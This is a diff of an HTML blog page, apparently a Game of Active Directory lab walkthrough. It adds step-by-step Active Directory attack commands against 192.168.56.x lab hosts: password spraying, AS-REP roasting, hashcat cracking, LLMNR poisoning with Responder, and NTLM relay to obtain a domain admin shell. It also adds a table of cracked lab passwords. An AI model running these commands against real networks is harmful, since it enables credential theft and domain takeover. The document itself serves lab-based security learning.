@@ -80,7 +80,7 @@
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          3 min read
+          7 min read
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
@@ -234,7 +234,7 @@ _ldap._
 <p><img src="https://github.com/user-attachments/assets/1ce0139d-4084-4ccf-b4fb-078c59dd8f86" alt="goad_part1_6"></p>
 <h3 id="domain-group-enumeration">Domain Group enumeration</h3>
 <ul>
-<li>I ran crackmapexec without creds but did don’t get an output on any domain</li>
+<li>I ran crackmapexec without creds but did don’t get an output on any domain.</li>
 <li>We can run either <code>crackmapexec</code> or <code>enum4linux</code> with samwell’s creds and extract some domain group information. We will only able to retrieve information on the <code>north</code> domain.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">enum4linux <span style="color:#f92672">-</span>a <span style="color:#f92672">-</span>U <span style="color:#ae81ff">192.168.56.11</span>  <span style="color:#f92672">-</span>u samwell.tarly <span style="color:#f92672">-</span>p Heartsbane
@@ -242,6 +242,125 @@ _ldap._
 <ul>
 <li>We can map them out as shown:</li>
 </ul>
+<pre tabindex="0"><code>| Group                       | RID  | Members                                                                                                                                                                                                                                                                                              |
+| --------------------------- | ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Mormont                     | 1108 | NORTH\jeor.mormont                                                                                                                                                                                                                                                                                   |
+| Night Watch                 | 1107 | NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont                                                                                                                                                                                                                                              |
+| Domain Guests               | 514  | NORTH\Guest                                                                                                                                                                                                                                                                                          |
+| Group Policy Creator Owners | 520  | NORTH\Administrator                                                                                                                                                                                                                                                                                  |
+| Domain Computers            | 515  | NORTH\CASTELBLACK$                                                                                                                                                                                                                                                                                   |
+| Stark                       | 1106 | NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow                                                                                                                                 |
+| Domain Users                | 513  | NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc |
+</code></pre><h2 id="valid-usernames">Valid Usernames</h2>
+<ul>
+<li>With valid usernames for the <code>north</code> domain, we can attempt a <code>password spray</code> to hunt for <code>valid credentials</code> or perform an <code>ASREPRoast</code> using the valid credentials we obtained.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/7663bff7-5d78-4a4b-a343-f33533689439" alt="goad_part1_8"></p>
+<h3 id="password-spraying">Password Spraying</h3>
+<ul>
+<li>In this attack, we aim to identify valid user credentials by attempting few <code>commonly used passwords</code>. In organizations with a fairly high number of users, there’s a chance that some are using weak passwords.</li>
+<li>This attack contrasts with a standard brute-force that involves attempting many passwords against a single account which we cannot launch against this environment due to the account lockout policy shown below.</li>
+<li><code>enum4linux</code> scan results:</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/2e3cd50c-1aad-43c0-8e93-6ea07d10723b" alt="goad_part1_9"></p>
+<ul>
+<li>We can use <code>crackmapexec's --no-bruteforce</code> parameter to achieve the password spray. I created a list of the user accounts and proceeded to use that list for the password list as well.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">crackmapexec smb <span style="color:#ae81ff">192.168.56.11</span> <span style="color:#f92672">-</span>u actualusers.txt <span style="color:#f92672">-</span>p actualusers.txt <span style="color:#f92672">--</span>no<span style="color:#f92672">-</span>bruteforce
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/fd776074-0b08-4afc-83e7-0cac91ffa914" alt="goad_part1_10"></p>
+<ul>
+<li>We get <code>hodor's</code> credentials.</li>
+</ul>
+<h3 id="as-reproasting">AS-REPRoasting</h3>
+<ul>
+<li>The authentication process for kerberos can be split into the following parts.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/5d835d65-8d56-4663-87c2-f81f0feca7bb" alt="goad_part1_11"></p>
+<ul>
+<li><code>AS-REPRoasting</code> allows attackers to extract Ticket Granting Tickets (TGT) for accounts that don’t have Kerberos <code>pre-authentication</code> enabled. Attackers can request an Authentication Service Response (AS-REP) from the KDC without knowing the user’s password. This response contains credential material that can be cracked offline.</li>
+<li><code>Pre-authentication</code> ensures users send encrypted requests to the KDC when authenticating to services. When disabled, users send plain text requests and receive an encrypted AS-REP, making them vulnerable to offline cracking.</li>
+<li>We need valid user credentials (low privileged accounts work) to identify the target accounts. Using <code>samwell.tarly's</code> creds and <code>impacket-GetNPUsers</code>, we can enumerate the users.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">impacket<span style="color:#f92672">-</span>GetNPUsers north.sevenkingdoms.local<span style="color:#f92672">/</span>samwell.tarly<span style="color:#f92672">:</span>Heartsbane <span style="color:#f92672">-</span>request
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/11545056-36a1-4a6f-a3a9-33ab90454ba0" alt="goad_part1_12"></p>
+<ul>
+<li>Proceed to crack the credentials with hashcat.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">18200</span> <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0</span> brandon.hash <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt.gz
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/ae673976-8fb4-4227-8f75-eca024df54e8" alt="goad_part1_13"></p>
+<h2 id="no-valid-credentialsusernames">No Valid Credentials/Usernames</h2>
+<ul>
+<li>Lastly we will look at LLMNR Poisoning. In the event that you do not find any valid credentials or usernames, this is an essential step to take.</li>
+</ul>
+<h3 id="llmnr-poisoning">LLMNR Poisoning</h3>
+<p><img src="https://github.com/user-attachments/assets/a50dc902-2703-4b25-ae6a-e7ed0ebb5e06" alt="goad_part1_14"></p>
+<ul>
+<li>LLMNR (Link-Local Multicast Resolution), is a protocol in Windows used to resolve NetBIOS names of computers on the same subnet when DNS resolution fails. When attempting to locate unknown resources in a network, LLMNR multicasts requests across a network to attempt to find unknown routes e.g shares.</li>
+<li>Attackers can trick devices to sending sensitive information by pretending to be the resource that another computer is trying to locate.</li>
+</ul>
+<h4 id="listen-and-capture-hashes">Listen and capture hashes</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">sudo responder <span style="color:#f92672">-</span>I eth1
+</code></pre></div><ul>
+<li>We eventually harvest 2 user’s credentials in the network.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/e123e631-0f38-41f3-b417-4144e5c50cb1" alt="goad_part1_15"></p>
+<p><img src="https://github.com/user-attachments/assets/db05a801-60f1-4e3d-90c6-d5eb6069d2bf" alt="goad_part1_16"></p>
+<h4 id="crack-with-hashcat">Crack with hashcat</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">5600</span> <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0</span> ntlm.txt <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt.gz
+</code></pre></div><ul>
+<li>
+<p>We get <code>robb.stark's</code> hash.</p>
+</li>
+<li>
+<p><code>edd's</code> hash could not be cracked but, we can relay the hashes to machines where <code>SMB signing</code> is disabled. SMB signing prevents relay attacks by appending a digital signature on packets for integrity checks.</p>
+</li>
+</ul>
+<h4 id="find-targets-for-relaying">Find targets for relaying</h4>
+<ul>
+<li>We can use crackmapexec to find the target where SMB signing has been disabled.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">crackmapexec smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">--</span>gen<span style="color:#f92672">-</span>relay<span style="color:#f92672">-</span>list relay<span style="color:#f92672">-</span>targets.txt
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/b3f30989-8e8e-421b-a756-3360632a0937" alt="goad_part1_17"></p>
+<ul>
+<li>Castleback and Braavos domain controllers are vulnerable. For the attack to work, the user whose hashes being relayed has to be a local admin on the target.</li>
+<li>Disable SMB and HTTP Servers on responder to allow ntlmrelayx to relay the hashes instead of authenticating to itself. In Kali, the path is in the following folder.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">vi <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>responder<span style="color:#f92672">/</span>Responder.conf
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/7dd00f45-b5f7-453c-ac7c-b6849bbdefcf" alt="goad_part1_18"></p>
+<ul>
+<li>Start ntlmrelayx</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">impacket<span style="color:#f92672">-</span>ntlmrelayx <span style="color:#f92672">-</span>tf relay<span style="color:#f92672">-</span>targets.txt <span style="color:#f92672">-</span>smb2support <span style="color:#f92672">-</span>socks
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/b50fcbab-b8bc-46aa-9ced-6bd578437dc7" alt="goad_part1_19"></p>
+<ul>
+<li>Start responder as well.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">sudo responder <span style="color:#f92672">-</span>I eth1
+</code></pre></div><ul>
+<li>After a while we see this output where <code>eddard.stark</code> is able to authenticate to the <code>mereen</code> and <code>braavos</code> server.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/362213ff-b039-4261-b69b-20cf2b4888ad" alt="goad_part1_20"></p>
+<ul>
+<li>If we type the command <code>socks</code>, we can also see the admin status of our connection to the machines.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/4fb90968-3ac1-43b8-956b-59d21cf153ee" alt="goad_part1_21"></p>
+<ul>
+<li>We can authenticate as edd on the <code>192.168.56.22</code> machine <code>castleback</code> using <code>impacket-smbexec</code>. We can see edd.stark is a domain admin on the north domain.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">proxychains impacket<span style="color:#f92672">-</span>smbexec <span style="color:#f92672">-</span>no<span style="color:#f92672">-</span>pass <span style="color:#e6db74">&#39;NORTH&#39;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#39;EDDARD.STARK&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;192.168.56.22&#39;</span>
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/8450cd49-0fd6-4237-9597-ec07d1b36fa0" alt="goad_part1_22"></p>
+<ul>
+<li>In part 2, we will work with Bloodhound and see how to hunt for various misconfigurations with our access in the domains.</li>
+</ul>
+<h2 id="appendix">Appendix</h2>
+<h3 id="valid-credentials">Valid Credentials</h3>
+<pre tabindex="0"><code>| Username      | Password       |
+| ------------- | -------------- |
+| samwell.tarly | Heartsbane     |
+| hodor         | hodor          |
+| brandon.stark | iseedeadpeople |
+| robb.stark    | sexywolfy      |
+</code></pre><h3 id="valid-users">Valid Users</h3>
 <pre tabindex="0"><code>| Group                       | RID  | Members                                                                                                                                                                                                                                                                                              |
 | --------------------------- | ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | Mormont                     | 1108 | NORTH\jeor.mormont                                                                                                                                                                                                                                                                                   |
@@ -318,4 +437,3 @@ _ldap._
     </main>
   </body>
 </html>
-
